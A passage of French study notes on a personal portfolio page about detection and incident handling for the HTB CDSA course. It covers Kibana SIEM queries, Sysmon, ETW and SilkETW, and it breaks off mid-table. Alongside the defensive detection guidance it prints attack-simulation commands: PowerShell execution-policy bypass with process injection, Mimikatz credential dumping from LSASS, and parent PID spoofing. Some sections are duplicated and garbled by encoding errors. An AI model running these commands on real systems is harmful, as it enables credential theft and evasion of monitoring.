<!DOCTYPE html>

<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
<title> (CDSA) | c4tz</title>
<link href="static/css/style.css" rel="stylesheet"/>
<style>
/* Polished typography */
.prose{max-width:1000px}
.prose p{font-size:15.5px;line-height:1.8}
.prose h1,.prose h2,.prose h3{font-weight:700;letter-spacing:.2px}
.prose h1{font-size:30px}
.prose h2{font-size:22px;margin-top:22px}
.prose h3{font-size:18px;margin-top:18px}
.prose li{margin:6px 0}
/* code blocks more readable */
.prose pre{font-size:13.5px;line-height:1.6;word-wrap:break-word;white-space:pre-wrap}
/* soft tables */
.prose table{background:rgba(255,255,255,.01)}
.prose th{color:#cfd6e3;font-weight:600}
</style><style>
.prose pre,
pre {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  border-radius: 0 !important;
  padding: 0 !important;
  margin: 0.75rem 0 !important;
}
.prose pre code,
pre code,
code, kbd, samp {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
}
.prose pre code,
pre code {
  display: block;
  white-space: pre-wrap !important;
  word-break: break-word !important;
}
</style></head>
<div class="page">
<aside class="sidebar">
<a class="brand" href="about.html">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<div><h1>c4tz</h1><p>Portfolio &amp; writeups</p></div>
</a>
<nav class="snav">
<ul>
<li><a alt="" href="writeup.html"> Write Up</a></li>
<li><a alt="" href="portfolio.html"> Portfolio</a></li>
<li><a alt="" href="skills.html"> Skills</a></li>
<li><a alt="" href="about.html"> About</a></li>
</ul>
</nav>
<div class="social">
<a href="https://tryhackme.com" rel="noopener" target="_blank">
<img alt="TryHackMe (cat)" src="static/image/thm.png"/>
</a>
<a href="https://zindi.africa/users/c4tz" rel="noopener" target="_blank">
<img alt="Zindi (cat)" src="static/image/zindi.png"/>
</a>
<a href="https://app.hackthebox.com" rel="noopener" target="_blank">
<img alt="Hack The Box (cat)" src="static/image/htb.png"/>
</a>
<a href="https://www.root-me.org/c4tz" rel="noopener" target="_blank">
<img alt="Root-Me (cat)" src="static/image/rootme.png"/>
</a>
<a href="https://github.com/c4tzzz" rel="noopener" target="_blank">
<img alt="GitHub (cat)" src="static/image/github.png"/>
</a>
</div>
</aside>
<div class="content">
<div class="topbar">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<strong>c4tz</strong>
</div>
<main class="main">
<h2 class="page-title"> (CDSA)</h2>
<section class="prose"><article class="page sans" id="1e825200-7eb4-80c0-8937-f624571396d6"><header> <h1 class="page-title">compte rendu CDSA</h1><p class="page-description"></p></header><div class="page-body"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Incident Handling Process </strong></summary><div class="indented"><figure class="image" id="1e825200-7eb4-808a-a652-fe0850744a32"><a href="image.png"><img src="image.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8017-94cf-f21b435e6d06"><a href="image%201.png"><img src="image%201.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8054-8cdb-fb3a90286af3"><a href="image%202.png"><img src="image%202.png" style="width:451.984375px"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Security Monitoring &amp; SIEM Fundamentals</strong></summary><div class="indented"><figure class="image" id="1e825200-7eb4-80a4-ab9e-ed8ddae338be"><a href="image%203.png"><img src="image%203.png" style="width:451.984375px"/></a></figure><figure class="image" id="1e825200-7eb4-8067-8d07-dcf1f819e2d1"><a href="image%204.png"><img src="image%204.png" style="width:451.984375px"/></a></figure><p class="" id="1e825200-7eb4-8005-9a44-ed032a3ebd7f"><a href="https://academy.hackthebox.com/storage/modules/211/MITRE.gif">Voir le sch√©ma MITRE</a></p><figure class="image" id="1e825200-7eb4-80ed-a890-fe975ac882c4"><a href="image%205.png"><img src="image%205.png" style="width:451.96875px"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">SIEM Visualization Example 1: Failed Logon Attempts (All Users)</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80e5-a28c-ff9ef728ae93"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> √âtapes √† suivre
Acc√©der au syst√®me cible

    Ouvrir l‚Äôoutil SIEM √† l‚Äôadresse : http://[IP Cible]:5601.

    Aller dans le menu Dashboard.
Modifier le Dashboard

    Cliquer sur l‚Äôic√¥ne en forme de crayon pour passer en mode √©dition.

    S√©lectionner Create visualization pour cr√©er une nouvelle visualisation.
Configurer la visualisation
 Filtres

    Event ID : 4624 (connexions r√©ussies).

    Type de connexion : RemoteInteractive via le champ winlog.logon.type.

 Index

    Utiliser l‚Äôindex pattern windows pour cibler les logs Windows.

 V√©rification

    S‚Äôassurer que le champ user.name.keyword est bien pr√©sent dans les donn√©es.

 Type de visualisation

    Choisir le type Table.
Configurer la table
 Lignes √† afficher

    Compte de service : user.name (filtr√© avec svc-).

    Machine cible : host.hostname.keyword.

    IP initiatrice : related.ip.keyword.

    Nombre d'√©v√©nements : via l'agr√©gat count.

 M√©trique

    S√©lectionner count pour afficher le nombre total d'√©v√©nements.

 Requ√™te KQL

user.name: svc-*
Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 2: Failed Logon Attempts (Disabled Users)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8057-bc02-e7a83db1c89e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> √âtapes √† suivre
Acc√©der au syst√®me cible

    Ouvrir l‚Äôoutil SIEM √† l‚Äôadresse : http://[IP Cible]:5601.

    Dans le menu lat√©ral, cliquer sur Dashboard.
Modifier le Dashboard

    Cliquer sur l‚Äôic√¥ne en forme de crayon pour passer en mode √©dition.

    Cliquer sur Create visualization pour cr√©er une nouvelle visualisation.
Configurer la visualisation
 Filtres

    Event ID : 4625 (tentatives de connexion √©chou√©es).

    Sous-statut : winlog.event_data.SubStatus : 0xC0000072 pour identifier les connexions √©chou√©es dues √† des comptes d√©sactiv√©s.

 Index Pattern

    S√©lectionner windows* pour utiliser les logs Windows.

 V√©rification

    V√©rifier que le champ user.name.keyword est bien disponible dans les donn√©es.

 Type de visualisation

    Choisir le type Table.
Configurer le tableau
 Champs √† afficher

    Utilisateur d√©sactiv√© : via user.name.

    Machine concern√©e : host.hostname.keyword.

    Nombre de tentatives : ajouter une m√©trique count pour compter les √©v√©nements.
Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 3: Successful RDP Logon Related To Service Accounts</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8059-a666-cc9cd5006fba"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectif

Cr√©er une visualisation pour surveiller les connexions RDP r√©ussies effectu√©es par des comptes de service dans un environnement Windows.
√âtapes √† suivre
Acc√©der au syst√®me cible
Se rendre sur l‚Äôinterface SIEM √† l‚Äôadresse : http://[IP Cible]:5601.
Ouvrir le menu lat√©ral et cliquer sur Dashboard.
Modifier le Dashboard
Cliquer sur l‚Äôic√¥ne crayon pour activer le mode √©dition.
S√©lectionner Create visualization pour d√©marrer la cr√©ation.
Configurer la visualisation
Filtres
Event ID : 4624 (connexions r√©ussies).
Type de logon : RemoteInteractive via le champ winlog.logon.type.
Index Pattern
Utiliser windows pour filtrer les logs li√©s √† Windows.
V√©rification
Confirmer que le champ user.name.keyword est bien pr√©sent dans les donn√©es.
Type de visualisation
Choisir le type Table.
Configurer le tableau
Champs √† afficher
Compte de service : user.name (avec un filtre svc-).
Machine cible : host.hostname.keyword.
IP source : related.ip.keyword.
Nombre d‚Äô√©v√©nements : utiliser la m√©trique count.
M√©trique
Ajouter count pour afficher le nombre total de connexions.
Requ√™te KQL

user.name: svc-*
Enregistrer
Cliquer sur Save and return pour enregistrer et revenir au tableau de bord.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SIEM Visualization Example 4: Users Added Or Removed From A Local Group (Within A Specific Timeframe)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-806d-b678-c7329b7aa93e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all"> √âtapes √† suivre
Acc√©der au syst√®me cible

    Ouvrir l‚Äôoutil SIEM via l‚Äôadresse : http://[IP Cible]:5601.

    Dans la navigation lat√©rale, s√©lectionner Dashboard.
Modifier le Dashboard

    Cliquer sur l‚Äôic√¥ne crayon pour passer en mode √©dition.

    Cliquer sur Create visualization pour commencer.
Configurer la visualisation
 Filtres

    Event IDs : 4732 (ajout d‚Äôun utilisateur au groupe) et 4733 (suppression d‚Äôun utilisateur du groupe).

    Restreindre aux √©v√©nements li√©s au groupe Administrators via group.name.keyword.

 Index Pattern

    Utiliser windows* pour cibler les journaux Windows.

 V√©rification

    S‚Äôassurer que le champ user.name.keyword est disponible dans les donn√©es.

 Type de visualisation

    S√©lectionner le type Table.
Configurer le tableau
 Champs √† afficher

    Utilisateur concern√© : winlog.event_data.MemberSid.keyword.

    Groupe cible : group.name.keyword (doit √™tre "Administrators").

    Action effectu√©e : event.action.keyword (ajout ou suppression).

    Machine impliqu√©e : host.name.keyword.

    Nombre d‚Äô√©v√©nements : ajouter la m√©trique count.
D√©finir la p√©riode

    Appliquer un filtre de date allant du 5 mars 2023 jusqu‚Äô√† la date actuelle.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Event Logs &amp; Finding Evil</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Analyzing Evil With Sysmon &amp; Event Logs</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80eb-91d6-f6ba599815d3"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction √† Sysmon

Sysmon (System Monitor) est un outil Windows qui journalise en d√©tail l'activit√© du syst√®me gr√¢ce √† trois composants principaux :
Service Windows : surveille les actions syst√®me.
Pilote noyau : capture les donn√©es.
Journal d‚Äô√©v√©nements : affiche les activit√©s d√©tect√©es.
√âv√©nements Sysmon courants :
ID 1 : Cr√©ation de processus
ID 3 : Connexion r√©seau

La configuration se fait via un fichier XML permettant d‚Äôinclure ou d‚Äôexclure des √©v√©nements selon des crit√®res pr√©cis (nom de processus, IP, etc.).

Configurations recommand√©es :
SwiftOnSecurity Sysmon Config
Olaf Hartong Modular Config
Installation (droits administrateur requis) :

C:\Tools\Sysmon&gt; sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
Appliquer une configuration personnalis√©e :

C:\Tools\Sysmon&gt; sysmon.exe -c fichier.xml

Cas de d√©tection
1‚É£ D√©tection de DLL Hijacking

Utilise l‚ÄôEvent ID 7 (chargement de modules).
√âtapes :
V√©rifier dans le fichier sysmonconfig-export.xml que les √©v√©nements de type module load ne sont pas exclus.
Surveiller via : Event Viewer &gt; Applications and Services &gt; Microsoft &gt; Windows &gt; Sysmon.
Indicateurs de compromission :
calc.exe ex√©cut√© depuis un r√©pertoire en √©criture
WININET.dll charg√© en dehors de System32
DLL sign√©e Microsoft remplac√©e par une version non sign√©e

2‚É£ D√©tection d‚Äôinjection PowerShell/C# dans processus non-manag√©s

Surveille l‚Äôex√©cution anormale de code manag√© dans des processus natifs.
Signes √† observer :
Chargement de clr.dll ou clrjit.dll dans des processus qui n‚Äôutilisentt normalement pas .NET
Analyse des processus via Process Hacker
Exemple d‚Äôinjection :

powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [PID] -PoshCode "Write-Host 'Hello, World!'"
Event ID 7 peut montrer les DLLs .NET charg√©es dans des contextes inhabituels.

3‚É£ D√©tection de vol d‚Äôidentifiants (ex. : Mimikatz)

Cible le processus LSASS pour l‚Äôextraction de mots de passe.
Surveillance :
Event ID 10 : acc√®s √† des processus sensibles comme LSASS.
Indicateurs :
Processus al√©atoires acc√©dant √† LSASS
SourceUser diff√©rent de TargetUser (ex. : waldo acc√©dant √† SYSTEM)
Requ√™tes de privil√®ge SeDebugPrivilege
Exemple Mimikatz :

C:\Tools\Mimikatz&gt; mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Event Tracing for Windows (ETW)</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8065-bf43-f74e0523be31"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d‚Äôensemble : Event Tracing for Windows (ETW)

ETW (Event Tracing for Windows) est un outil de journalisation haute performance int√©gr√© √† Windows. Il permet de tracer dynamiquement les √©v√©nements du syst√®me en temps r√©el, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :
La d√©tection d‚Äôanomalies
L‚Äôanalyse des incidents de s√©curit√©
Les investigations forensic d√©taill√©es

ETW couvre un large spectre : appels syst√®me, cr√©ation/terminaison de processus, activit√© r√©seau, changements de fichiers/registre, etc.

Composants cl√©s d‚ÄôETW
Controllers
G√®rent les sessions ETW (d√©marrage, arr√™t, activation des fournisseurs)
Exemple :

logman.exe query -ets
Providers
G√©n√®rent les √©v√©nements
4 types :
MOF Providers : Bas√©s sur le Managed Object Format
WPP Providers : Tracing c√¥t√© noyau via annotations dans le code
Manifest-based : D√©finis via XML
TraceLogging : Fournisseurs modernes simplifi√©s
Consumers
Souscrivent √† des √©v√©nements pr√©cis (souvent stock√©s en fichiers .ETL)
Channels
Regroupent les √©v√©nements de mani√®re logique, facilitant l‚Äôabonnement s√©lectif
ETL Files
Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

Interagir avec ETW
Commandes via logman
Lister les sessions actives

logman.exe query -ets
Voir les d√©tails d‚Äôune session sp√©cifique

logman.exe query "EventLog-System" -ets
Lister tous les providers disponibles

logman.exe query providers
Interfaces graphiques
Performance Monitor : Visualise et g√®re les sessions ETW
EtwExplorer : Inspecte les m√©tadonn√©es des providers ETW

Providers utiles en cybers√©curit√©

| Provider | Fonction |
| --- | --- |
| Microsoft-Windows-Kernel-Process | Activit√© de processus (injection, hollowing) |
| Microsoft-Windows-Kernel-File | Surveillance des fichiers (exfiltration, ransomware) |
| Microsoft-Windows-Kernel-Network | Activit√© r√©seau suspecte |
| Microsoft-Windows-SMBClient / SMBServer | Suivi du trafic SMB (mouvement lat√©ral) |
| Microsoft-Windows-DotNETRuntime | Ex√©cution .NET potentiellement malveillante |
| Microsoft-Windows-PowerShell | Traces d‚Äôactivit√© PowerShell |
| Microsoft-Windows-TerminalServices-LocalSessionManager | D√©tection d‚Äôacc√®s RDP |

Provider restreint : Microsoft-Windows-Threat-Intelligence
Fournisseur avanc√© n√©cessitant des droits privil√©gi√©s (PPL)
Utilis√© en DFIR (Digital Forensics &amp; Incident Response) pour identifier :
Les menaces sophistiqu√©es
Leur origine, impact, et interaction
Peut √™tre activ√© via contournements sp√©cifiques, mais reste sensible</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tapping Into ETW</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8002-8b18-ebdbc7bd8011"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d‚Äôensemble : Event Tracing for Windows (ETW)

ETW (Event Tracing for Windows) est un outil de journalisation haute performance int√©gr√© √† Windows. Il permet de tracer dynamiquement les √©v√©nements du syst√®me en temps r√©el, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :
La d√©tection d‚Äôanomalies
L‚Äôanalyse des incidents de s√©curit√©
Les investigations forensic d√©taill√©es

ETW couvre un large spectre : appels syst√®me, cr√©ation/terminaison de processus, activit√© r√©seau, changements de fichiers/registre, etc.

Composants cl√©s d‚ÄôETW
Controllers
G√®rent les sessions ETW (d√©marrage, arr√™t, activation des fournisseurs)
Exemple :

logman.exe query -ets
Providers
G√©n√®rent les √©v√©nements
4 types :
MOF Providers : Bas√©s sur le Managed Object Format
WPP Providers : Tracing c√¥t√© noyau via annotations dans le code
Manifest-based : D√©finis via XML
TraceLogging : Fournisseurs modernes simplifi√©s
Consumers
Souscrivent √† des √©v√©nements pr√©cis (souvent stock√©s en fichiers .ETL)
Channels
Regroupent les √©v√©nements de mani√®re logique, facilitant l‚Äôabonnement s√©lectif
ETL Files
Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

Interagir avec ETW
Commandes via logman
Lister les sessions actives

logman.exe query -ets
Voir les d√©tails d‚Äôune session sp√©cifique

logman.exe query "EventLog-System" -ets
Lister tous les providers disponibles

logman.exe query providers
Interfaces graphiques
Performance Monitor : Visualise et g√®re les sessions ETW
EtwExplorer : Inspecte les m√©tadonn√©es des providers ETW

Providers utiles en cybers√©curit√©

| Provider | Fonction |
| --- | --- |
| Microsoft-Windows-Kernel-Process | Activit√© de processus (injection, hollowing) |
| Microsoft-Windows-Kernel-File | Surveillance des fichiers (exfiltration, ransomware) |
| Microsoft-Windows-Kernel-Network | Activit√© r√©seau suspecte |
| Microsoft-Windows-SMBClient / SMBServer | Suivi du trafic SMB (mouvement lat√©ral) |
| Microsoft-Windows-DotNETRuntime | Ex√©cution .NET potentiellement malveillante |
| Microsoft-Windows-PowerShell | Traces d‚Äôactivit√© PowerShell |
| Microsoft-Windows-TerminalServices-LocalSessionManager | D√©tection d‚Äôacc√®s RDP |

Provider restreint : Microsoft-Windows-Threat-Intelligence
Fournisseur avanc√© n√©cessitant des droits privil√©gi√©s (PPL)
Utilis√© en DFIR (Digital Forensics &amp; Incident Response) pour identifier :
Les menaces sophistiqu√©es
Leur origine, impact, et interaction
Peut √™tre activ√© via contournements sp√©cifiques, mais reste sensible</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Get-WinEvent</summary><div class="indented"><h3 class="" id="1e825200-7eb4-8089-a79b-ca33499f0038"> Vue d‚Äôensemble : D√©tections avanc√©es via ETW</h3><p class="" id="1e825200-7eb4-80ea-bee8-e92652cc02f5"><strong>Event Tracing for Windows (ETW)</strong> permet une visibilit√© approfondie sur les √©v√©nements syst√®me, allant au-del√† des journaux classiques. Coupl√© √† des outils comme <strong>SilkETW</strong>, il permet de d√©tecter des tactiques avanc√©es telles que la falsification de hi√©rarchie de processus ou le chargement de DLL .NET en m√©moire.</p><hr id="1e825200-7eb4-8058-b194-ebd19db364cc"/><h3 class="" id="1e825200-7eb4-803a-9fd8-d9fca0f2272f"> D√©tection 1 : Relations parent-enfant anormales</h3><p class="" id="1e825200-7eb4-80f4-864d-c9a03d1222ed">Des processus comme <code>calc.exe</code> lan√ßant <code>cmd.exe</code> peuvent indiquer une activit√© malveillante. Ces relations peuvent √™tre explor√©es avec <strong>Process Hacker</strong>.</p><h3 class="" id="1e825200-7eb4-80b7-842f-d42c6b3ad23a"> Simulation d‚Äôattaque : <em>Parent PID Spoofing</em></h3><p class="" id="1e825200-7eb4-80b7-8708-f2c02792944f">Les attaquants peuvent forger une relation parent/enfant avec un PID falsifi√©.</p><pre class="code code-wrap" id="1e825200-7eb4-80d8-bbd1-fede96e1ff67"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershell -ep bypass
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent([PID], "C:\Windows\System32\cmd.exe", "")</code></pre><h3 class="" id="1e825200-7eb4-80af-9606-f0fa2af03801"> D√©tection avec SilkETW</h3><p class="" id="1e825200-7eb4-806f-ae24-e8986d1fae09">Pour tracer correctement ces relations :</p><pre class="code code-wrap" id="1e825200-7eb4-8022-bfcd-db326a41248b"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json</code></pre><hr id="1e825200-7eb4-8067-9d02-ef01b3bd1a1c"/><h3 class="" id="1e825200-7eb4-8019-a952-dd1c64bfa5c7"> D√©tection 2 : Chargement de DLL .NET malveillantes en m√©moire</h3><p class="" id="1e825200-7eb4-80c3-87e1-cd2767f19ffb">Les attaquants utilisent des assemblages .NET charg√©s uniquement en m√©moire pour contourner l‚Äôantivirus et la d√©tection disque (tactique <strong>BYOL ‚Äì Bring Your Own Land</strong>).</p><h3 class="" id="1e825200-7eb4-80ca-97be-fdabe33719dd"> Simulation : Chargement m√©moire d‚Äôun outil comme <em>Seatbelt</em></h3><p class="" id="1e825200-7eb4-80c6-940b-de96a5356bd0">Ce type d‚Äôattaque charge des biblioth√®ques comme :</p><ul class="bulleted-list" id="1e825200-7eb4-80a4-bf06-daf2a2d99534"><li style="list-style-type:disc"><code>clr.dll</code></li></ul><ul class="bulleted-list" id="1e825200-7eb4-80e0-a96b-cb7326d6bd39"><li style="list-style-type:disc"><code>mscoree.dll</code></li></ul><p class="" id="1e825200-7eb4-8039-96a3-c506e57e4fb3">Sysmon Event ID 7 d√©tecte les DLL, mais <strong>ne capture pas l‚Äôensemble du comportement .NET</strong>.</p><h3 class="" id="1e825200-7eb4-80e0-825e-d1301b69898a"> D√©tection avec SilkETW + Provider .NET</h3><p class="" id="1e825200-7eb4-80e3-84cb-d8c163e683cf">Pour capturer les activit√©s .NET runtime :</p><pre class="code code-wrap" id="1e825200-7eb4-80e5-bb9b-f428b7e16eb5"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json</code></pre><p class="" id="1e825200-7eb4-80b3-8f6d-e9d0adb4ca7a"> <strong>Mots-cl√©s d‚Äôint√©r√™t (Keywords)</strong> :</p><ul class="bulleted-list" id="1e825200-7eb4-80b9-81d8-de7ed448e62a"><li style="list-style-type:disc"><code>JitKeyword</code> : Compilation Just-In-Time</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8082-9f95-ce3d27556c99"><li style="list-style-type:disc"><code>InteropKeyword</code> : Interactions entre code manag√©/non-manag√©</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8093-876d-c7aec059f731"><li style="list-style-type:disc"><code>LoaderKeyword</code> : Chargement dynamique d‚Äôassemblies</li></ul><ul class="bulleted-list" id="1e825200-7eb4-8012-8dda-fa472a250224"><li style="list-style-type:disc"><code>NGenKeyword</code> : Assemblies pr√©compil√©s</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">event ID</summary><div class="indented"><figure class="block-color-gray_background callout" id="1e825200-7eb4-8048-b1b1-e282666ea837" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><table class="simple-table" id="1e825200-7eb4-80d8-80a1-fd282fa2c8d7"><tbody><tr id="1e825200-7eb4-80b0-8d5d-f0155897e9d3"><td class="" id="ip`W"><strong>Event ID</strong></td><td class="" id="NW`S"><strong>Log Type</strong></td><td class="" id="WpzX"><strong>Cat√©gorie</strong></td><td class="" id="N@pW"><strong>Description</strong></td></tr><tr id="1e825200-7eb4-8036-be3e-fc83769f7d10"><td class="" id="ip`W"><strong>1074</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Shutdown / Restart</td><td class="" id="N@pW">Indique un red√©marrage ou arr√™t du syst√®me, avec raison.</td></tr><tr id="1e825200-7eb4-805a-86ae-f1451e61f61e"><td class="" id="ip`W"><strong>6005</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Start</td><td class="" id="N@pW">D√©marrage du service Event Log (souvent lors du boot).</td></tr><tr id="1e825200-7eb4-8061-97df-fc6973fc66f8"><td class="" id="ip`W"><strong>6006</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Stop</td><td class="" id="N@pW">Arr√™t du service Event Log (souvent lors de l‚Äôarr√™t).</td></tr><tr id="1e825200-7eb4-8099-a8a7-f6e0278edbd7"><td class="" id="ip`W"><strong>6013</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Uptime</td><td class="" id="N@pW">Indique le temps de fonctionnement de Windows en secondes.</td></tr><tr id="1e825200-7eb4-8016-a8ef-c5d2af6df91e"><td class="" id="ip`W"><strong>7040</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Configuration</td><td class="" id="N@pW">Modification du type de d√©marrage d‚Äôun service.</td></tr><tr id="1e825200-7eb4-8009-8bbd-e92082ba1c50"><td class="" id="ip`W"><strong>7045</strong></td><td class="" id="NW`S">System</td><td class="" id="WpzX">Service Installation</td><td class="" id="N@pW">Un nouveau service a √©t√© install√© (souvent utilis√© par des malwares).</td></tr></tbody></table><table class="simple-table" id="1e825200-7eb4-80e6-a158-eb64854ee5a0"><tbody><tr id="1e825200-7eb4-804b-9c7e-ff50b8292eaa"><td class="" id="CcTo"><strong>Event ID</strong></td><td class="" id="QMy\"><strong>Log Type</strong></td><td class="" id="TF\&gt;"><strong>Cat√©gorie</strong></td><td class="" id="uR\`"><strong>Description</strong></td></tr><tr id="1e825200-7eb4-8022-ab74-cfaa0d18b3b5"><td class="" id="CcTo"><strong>1102</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Audit Log</td><td class="" id="uR\`">Les logs de s√©curit√© ont √©t√© effac√©s (souvent utilis√© pour couvrir ses traces).</td></tr><tr id="1e825200-7eb4-80b9-9d3c-c8beea4ae120"><td class="" id="CcTo"><strong>1116</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">D√©tection de malware par l‚Äôantivirus.</td></tr><tr id="1e825200-7eb4-80b6-8464-e339106480b6"><td class="" id="CcTo"><strong>1118</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">D√©but de la rem√©diation antivirus.</td></tr><tr id="1e825200-7eb4-8050-96b6-c0af3de00ae2"><td class="" id="CcTo"><strong>1119</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Rem√©diation antivirus r√©ussie.</td></tr><tr id="1e825200-7eb4-8071-bccd-fd6f36198c9b"><td class="" id="CcTo"><strong>1120</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus</td><td class="" id="uR\`">Rem√©diation antivirus √©chou√©e.</td></tr><tr id="1e825200-7eb4-80c8-bc76-ef109ad3e821"><td class="" id="CcTo"><strong>4624</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion r√©ussie.</td></tr><tr id="1e825200-7eb4-80c3-a714-e1bc348f9125"><td class="" id="CcTo"><strong>4625</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion √©chou√©e (possibles attaques brute force).</td></tr><tr id="1e825200-7eb4-80ba-ba37-f2def3c299a4"><td class="" id="CcTo"><strong>4648</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Logon</td><td class="" id="uR\`">Connexion avec des identifiants explicites (souvent utilis√© en d√©placement lat√©ral).</td></tr><tr id="1e825200-7eb4-80fd-a9ac-c8c7920f2391"><td class="" id="CcTo"><strong>4656</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Access Control</td><td class="" id="uR\`">Requ√™te d‚Äôacc√®s √† un objet (fichier, cl√© registre‚Ä¶).</td></tr><tr id="1e825200-7eb4-804c-bd53-d9ec9e4b3900"><td class="" id="CcTo"><strong>4672</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Privileges</td><td class="" id="uR\`">Attribution de privil√®ges sp√©ciaux (administrateurs).</td></tr><tr id="1e825200-7eb4-802f-8867-c9c2b7082b2e"><td class="" id="CcTo"><strong>4698</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une t√¢che planifi√©e a √©t√© cr√©√©e.</td></tr><tr id="1e825200-7eb4-801c-923a-f26e6cd11c25"><td class="" id="CcTo"><strong>4700</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une t√¢che planifi√©e a √©t√© activ√©e.</td></tr><tr id="1e825200-7eb4-80fd-b29e-f27c7675ead9"><td class="" id="CcTo"><strong>4701</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une t√¢che planifi√©e a √©t√© d√©sactiv√©e.</td></tr><tr id="1e825200-7eb4-8003-8801-cd65198d70b5"><td class="" id="CcTo"><strong>4702</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Scheduled Task</td><td class="" id="uR\`">Une t√¢che planifi√©e a √©t√© modifi√©e.</td></tr><tr id="1e825200-7eb4-8051-8172-c1ac1628ab3d"><td class="" id="CcTo"><strong>4719</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Audit Policy</td><td class="" id="uR\`">Modification de la strat√©gie d‚Äôaudit.</td></tr><tr id="1e825200-7eb4-80db-a842-d7b37344b1f7"><td class="" id="CcTo"><strong>4738</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Account Management</td><td class="" id="uR\`">Modification d‚Äôun compte utilisateur.</td></tr><tr id="1e825200-7eb4-8043-bbab-e205b939c1c4"><td class="" 